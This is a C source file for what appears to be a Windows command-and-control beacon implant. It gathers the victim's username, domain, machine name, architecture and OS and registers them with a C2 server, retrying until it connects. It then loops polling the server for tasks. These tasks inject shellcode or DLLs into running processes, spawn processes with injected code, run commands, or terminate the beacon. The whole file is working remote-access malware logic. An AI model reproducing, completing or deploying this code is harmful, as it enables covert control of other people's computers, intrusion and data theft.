#define WIN32_LEAN_AND_MEAN

// headers needed so we can function

#include <windows.h>
#include <stdio.h>

// main header file

// #include "core.h"
#include "beacon.h"

// dynamic header file, contains all info for callback

#include "settings.h"

void Entry()
{
    BOOL     Success;
    DWORD    OpCode;
    char*    Buffer;
    DWORD    dwSize   = 63;
    BOOL     retValue = TRUE;
    LPCWSTR  UriBuffer[MAX_PATH * 3];
    struct   BasicUserInfo UserInfo;
    struct   BasicCompInfo CompInfo;

    // collect basic info about the user
    if (!GetBasicUserInfo(&UserInfo))
    {
        // thats kinda a tuff one, we need this info to function and if we can't get this basic info straight up we cant follow the protocol properly.
        // let still callback to the C2 but lets just inform them of the error, via NULLs. therefore we still get to keep the session cause other stuff might work.

        strcpy( UserInfo.UserName, "NULL" );
        strcpy( UserInfo.DomainName, "NULL" );
        strcpy( UserInfo.ComputerName, "NULL" );
    }

    // collect basic info about the computer
    if (!GetBasicCompInfo(&CompInfo))
    {
        // this is kinda bad, but we want to keep the session open so lets just carry on
        strcpy( CompInfo.Arch, "NULL" );
        strcpy( CompInfo.Secure, "NULL" );
        strcpy( CompInfo.OS, "NULL" );
    }

    // format the data correctly so it can be used when we call back to the c2
    sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
                                                                                                      CompInfo.Arch, CompInfo.OS, CompInfo.Secure);

    // register back with the c2
    while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
    {
        // not much we can do really if we cant hit the c2, guess we just wait an retry.
        DEBUG("Failed to connect\n");
        Sleep(_CALLBACK_JITTER);
    }

    // callback to the c2 and check if theres a commands to run, if so check what it is and run it. If the command then fails to run, report this back to the c2.

    while (TRUE)
    {

        Buffer = BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &OpCode, NULL, NULL, NULL);

        switch (OpCode)
        {
        case 0x1000:
            // no task, just sleep an check in later
            Success = TRUE;
            break;

        case 0x2000:
            // inject shellcode into a running process
            Success = InjectExecuteCode(Buffer);
            break;

        case 0x3000:
            // spawn a process and inject code into its main thread
            Success = SpawnExecuteCode(Buffer);
            break;

        case 0x4000:
            // stdlib command so lets run it
            Success = Stdlib(Buffer);
            break;

        case 0x5000:
            // inject a dll into a running process
            Success = InjectExecuteDll(Buffer);
            break;

        case 0x6000:
            // beacon will die
            return;
        }

        if (!Success)
        {
            ReportExecutionFail();
        }

        Sleep(_CALLBACK_JITTER);
    }

    // really should not hit this, so if it does lets just die
    DieCleanly();
}